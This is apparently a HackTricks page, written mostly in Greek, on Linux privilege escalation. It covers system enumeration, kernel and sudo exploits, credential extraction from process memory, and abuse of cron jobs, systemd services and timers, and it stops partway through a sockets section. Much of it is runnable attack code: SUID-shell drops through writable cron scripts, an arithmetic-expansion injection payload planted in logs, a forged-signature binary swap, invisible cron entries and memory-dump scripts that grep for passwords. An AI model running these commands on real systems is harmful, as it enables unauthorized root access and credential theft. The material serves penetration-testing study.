# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας ξεκινήσουμε να συλλέγουμε πληροφορίες για το OS που τρέχει.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Εάν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, μπορεί να μπορέσετε να hijack ορισμένες libraries ή binaries:
```bash
echo $PATH
```
### Πληροφορίες Env

Υπάρχουν ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή API keys στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την kernel έκδοση και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα με ευάλωτους πυρήνες και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξάγετε όλες τις ευάλωτες εκδόσεις πυρήνα από αυτήν την ιστοσελίδα μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση για kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτέλεση στο θύμα, μόνο ελέγχει exploits για kernel 2.x)

Πάντοτε **search the kernel version in Google**, ίσως η kernel version σας να αναφέρεται σε κάποιο kernel exploit και τότε θα είστε σίγουροι ότι αυτό το exploit είναι έγκυρο.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Έκδοση sudo

Με βάση τις ευάλωτες εκδόσεις του sudo που εμφανίζονται σε:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Οι εκδόσεις του Sudo πριν από το 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) επιτρέπουν σε unprivileged local users να escalate τις privileges τους σε root μέσω της επιλογής sudo `--chroot` όταν το αρχείο `/etc/nsswitch.conf` χρησιμοποιείται από έναν user controlled directory.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν τρέξετε το exploit, βεβαιωθείτε ότι η `sudo` έκδοσή σας είναι vulnerable και ότι υποστηρίζει το χαρακτηριστικό `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στην πρωτότυπη [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg — η επαλήθευση της υπογραφής απέτυχε

Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του πώς αυτό το vuln θα μπορούσε να αξιοποιηθεί
```bash
dmesg 2>/dev/null | grep "signature"
```
### More system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγράψτε πιθανές άμυνες

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:


{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι προσαρτημένο και τι όχι**, πού και γιατί. Αν κάτι δεν είναι προσαρτημένο, μπορείτε να δοκιμάσετε να το προσαρτήσετε και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαρίθμηση χρήσιμων binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν **any compiler is installed**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να compile it στον υπολογιστή όπου πρόκειται να το χρησιμοποιήσετε (ή σε έναν παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο Ευάλωτο Λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να εκμεταλλευτεί για privilege escalation…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχεις πρόσβαση SSH στη μηχανή, μπορείς επίσης να χρησιμοποιήσεις **openVAS** για να ελέγξεις για παρωχημένο και ευάλωτο λογισμικό εγκατεστημένο στη μηχανή.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κατά κύριο λόγο θα είναι άχρηστες, επομένως συνιστώνται εφαρμογές όπως OpenVAS ή παρόμοιες που θα ελέγξουν εάν οποιαδήποτε εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Διαδικασίες

Ρίξε μια ματιά σε **ποιες διαδικασίες** εκτελούνται και έλεγξε αν κάποια διαδικασία έχει **περισσότερα προνόμια από ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από root;)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Παρακολούθηση διεργασιών

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσετε ευάλωτες διεργασίες που εκτελούνται συχνά ή όταν πληρούνται ορισμένες προϋποθέσεις.

### Μνήμη διεργασίας

Ορισμένες υπηρεσίες σε έναν server αποθηκεύουν **credentials σε απλό κείμενο μέσα στη μνήμη**.\
Κανονικά θα χρειαστείτε **root privileges** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, οπότε αυτό είναι συνήθως πιο χρήσιμο όταν ήδη είστε root και θέλετε να ανακαλύψετε περισσότερα credentials.\
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

> [!WARNING]
> Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να dump άλλες διεργασίες που ανήκουν σε μη προνομιούχο χρήστη.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο ID διεργασίας, **maps δείχνουν πώς η μνήμη αντιστοιχίζεται μέσα στον** εικονικό χώρο διευθύνσεων της διεργασίας· δείχνουν επίσης τα **δικαιώματα κάθε αντιστοιχισμένης περιοχής**. Το ψευδο-αρχείο **mem** **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **μετακινηθούμε στο αρχείο mem και να εξάγουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του kernel μπορεί να προσπελαστεί χρησιμοποιώντας /dev/kmem.\
Συνήθως, `/dev/mem` είναι αναγνώσιμο μόνο από **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για Linux

Το ProcDump είναι μια εκδοχή για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρες το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Για να κάνετε dump τη μνήμη μιας διεργασίας μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις για root και να κάνετε dump τη διεργασία που ανήκει σε εσάς
- Script A.5 από [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Credentials from Process Memory

#### Manual example

Εάν διαπιστώσετε ότι η διεργασία authenticator εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump τη process (βλ. τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους να dump τη memory μιας process) και να αναζητήσετε credentials μέσα στη memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει διαπιστευτήρια απλού κειμένου από τη μνήμη** και από μερικά **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Λειτουργία                                       | Όνομα Διεργασίας    |
| ------------------------------------------------- | -------------------- |
| Κωδικός GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Ενεργές συνδέσεις FTP)                    | vsftpd               |
| Apache2 (Ενεργές συνεδρίες HTTP Basic Auth)       | apache2              |
| OpenSSH (Ενεργές συνεδρίες SSH - Χρήση sudo)      | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένες/Cron εργασίες

### Crontab UI (alseambusher) που τρέχει ως root – web-based scheduler privesc

Εάν ένα web “Crontab UI” panel (alseambusher/crontab-ui) τρέχει ως root και είναι δεσμευμένο μόνο στο loopback, μπορείτε να το προσεγγίσετε μέσω SSH local port-forwarding και να δημιουργήσετε ένα privileged job για escalation.

Τυπική αλυσίδα
- Ανακαλύψτε πόρτα προσβάσιμη μόνο από loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε credentials σε operational artifacts:
  - Backups/scripts με `zip -P <password>`
  - systemd unit που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel και login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιούργησε ένα high-priv job και εκτέλεσέ το αμέσως (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Μην εκτελείτε το Crontab UI ως root; περιορίστε το σε έναν αφιερωμένο χρήστη με ελάχιστα δικαιώματα
- Δεσμεύστε σε localhost και επιπλέον περιορίστε την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε passwords
- Αποφύγετε την ενσωμάτωση secrets σε unit files· χρησιμοποιήστε secret stores ή root-only EnvironmentFile
- Ενεργοποιήστε audit/logging για on-demand job executions

Ελέγξτε αν κάποια scheduled job είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln? μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; use symlinks? να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε πώς ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Εάν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_ Τότε, μπορείτε να αποκτήσετε shell root χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί ένα script με wildcard (Wildcard Injection)

Εάν ένα script εκτελείται από τον root και έχει ένα “**\***” μέσα σε μια εντολή, μπορείς να το εκμεταλλευτείς για να κάνεις μη αναμενόμενα πράγματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Αν το wildcard ακολουθεί μια διαδρομή όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ούτε καν** _**./\***_ **).**

Διαβάστε την παρακάτω σελίδα για περισσότερα wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash πραγματοποιεί parameter expansion και command substitution πριν από την arithmetic evaluation σε ((...)), $((...)) και let. Αν ένας root cron/parser διαβάζει μη αξιόπιστα πεδία log και τα τροφοδοτεί σε arithmetic context, ένας attacker μπορεί να εισάγει ένα command substitution $(...) που εκτελείται ως root όταν τρέχει το cron.

- Γιατί λειτουργεί: Σε Bash, οι expansions συμβαίνουν με την εξής σειρά: parameter/variable expansion, command substitution, arithmetic expansion, και μετά word splitting και pathname expansion. Έτσι μια τιμή όπως `$(/bin/bash -c 'id > /tmp/pwn')0` πρώτα υποκαθίσταται (τρέχοντας την εντολή), και το υπόλοιπο numeric `0` χρησιμοποιείται για την arithmetic ώστε το script να συνεχίσει χωρίς σφάλματα.

- Τυπικό ευάλωτο pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Βάλτε attacker-controlled κείμενο στο parsed log έτσι ώστε το πεδίο που μοιάζει με αριθμό να περιέχει ένα command substitution και να τελειώνει με ψηφίο. Βεβαιωθείτε ότι η εντολή σας δεν γράφει στο stdout (ή ανακατευθύνετέ το) ώστε η arithmetic να παραμένει έγκυρη.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Αν μπορείτε να **modify ένα cron script** που εκτελείται από root, μπορείτε να αποκτήσετε shell πολύ εύκολα:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **φάκελο όπου έχετε πλήρη πρόσβαση**, ίσως είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν symlink φάκελο προς κάποιον άλλο** που να εξυπηρετεί ένα script υπό τον έλεγχό σας.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Οι Blue teams μερικές φορές "sign" cron-driven binaries κάνοντας dump ενός custom ELF section και grepping για ένα vendor string πριν τα εκτελέσουν ως root. Αν αυτό το binary είναι group-writable (π.χ., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) και μπορείτε να leak το signing material, μπορείτε να πλαστογραφήσετε το section και να ανακαταλάβετε την cron job:

1. Χρησιμοποιήστε `pspy` για να καταγράψετε τη ροή επαλήθευσης. Στην Era, ο root έτρεξε `objcopy --dump-section .text_sig=text_sig_section.bin monitor` και στη συνέχεια `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` και μετά εκτέλεσε το αρχείο.
2. Αναδημιουργήστε το αναμενόμενο certificate χρησιμοποιώντας το leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Επικαλύψτε (overwrite) το scheduled binary διατηρώντας τα execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Περιμένετε την επόμενη εκτέλεση του cron· μόλις ο απλός έλεγχος υπογραφής πετύχει, το payload σας θα τρέξει ως root.

### Frequent cron jobs

Μπορείτε να παρακολουθείτε τις διεργασίες για να εντοπίσετε αυτές που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως να μπορέσετε να εκμεταλλευτείτε αυτό και να escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα απαριθμεί κάθε διαδικασία που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατό να δημιουργήσετε ένα cronjob **βάζοντας ένα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε το χαρακτήρα carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Εγγράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε αρχείο `.service`. Αν μπορείτε, **μπορείτε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **εκκινείται**, **επαναεκκινείται** ή **τερματίζεται** (ίσως χρειαστεί να περιμένετε μέχρι να επανεκκινηθεί η μηχανή).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο αρχείο `.service` με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα binaries υπηρεσιών

Λάβετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής πάνω στα binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα τροποποιήσετε για να προσθέσετε backdoors, έτσι ώστε όταν οι υπηρεσίες επανεκτελεστούν τα backdoors να εκτελεστούν.

### systemd PATH - Σχετικές Διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Αν διαπιστώσεις ότι μπορείς να **γράψεις** σε οποιονδήποτε από τους φακέλους της διαδρομής, ενδέχεται να μπορέσεις να **αποκτήσεις αυξημένα προνόμια**. Πρέπει να αναζητήσεις **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία διαμόρφωσης υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιουργήστε ένα **executable** με το **same name as the relative path binary** μέσα στον systemd PATH φάκελο που μπορείτε να γράψετε, και όταν η υπηρεσία ζητηθεί να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor** σας θα εκτελεστεί (οι μη προνομιούχοι χρήστες συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν υπηρεσίες αλλά ελέγξτε αν μπορείτε να χρησιμοποιήσετε `sudo -l`).

**Μάθετε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Χρονοδιακόπτες**

**Χρονοδιακόπτες** είναι αρχεία unit του systemd των οποίων το όνομα τελειώνει σε `**.timer**` που ελέγχουν αρχεία ή γεγονότα `**.service**`. Οι **Χρονοδιακόπτες** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron καθώς έχουν ενσωματωμένη υποστήριξη για γεγονότα βάσει ημερολογίου και μονοτονικά χρονικά γεγονότα και μπορούν να τρέξουν ασύγχρονα.

Μπορείτε να απαριθμήσετε όλους τους χρονοδιακόπτες με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι timers

Αν μπορείτε να τροποποιήσετε έναν timer, μπορείτε να τον κάνετε να εκτελέσει κάποια υπάρχοντα του systemd.unit (όπως ένα `.service` ή ένα `.target`)
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:

> Η μονάδα που θα ενεργοποιηθεί όταν λήξει αυτό το timer. Το όρισμα είναι ένα όνομα μονάδας, του οποίου το επίθημα δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια service που έχει το ίδιο όνομα με την timer unit, εκτός από την κατάληξη. (Βλ. παραπάνω.) Συνιστάται το όνομα της μονάδας που ενεργοποιείται και το όνομα της timer unit να είναι ταυτόσημα, εκτός από την κατάληξη.

Επομένως, για να καταχραστείτε αυτή την άδεια θα χρειαστεί να:

- Βρείτε κάποια systemd unit (όπως `.service`) που **εκτελεί ένα writable binary**
- Βρείτε κάποια systemd unit που **εκτελεί ένα relative path** και έχετε **writable privileges** πάνω στο **systemd PATH** (για να υποδυθείτε το executable)

Μάθετε περισσότερα για τους timers με `man systemd.timer`.

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε ένα timer χρειάζεστε δικαιώματα root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** δημιουργώντας ένα symlink προς αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** στον ίδιο ή σε διαφορετικούς υπολογιστές μέσα σε μοντέλα client-server. Χρησιμοποιούν τυπικά Unix descriptor αρχεία για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω αρχείων `.socket`.

Sockets μπορούν να ρυθμιστούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν αλλά χρησιμοποιείται μια σύνοψη για να **υποδείξει πού θα ακούει** το socket (το path του AF_UNIX socket αρχείου, η IPv4/6 και/ή ο αριθμός θύρας για ακρόαση, κλπ.)
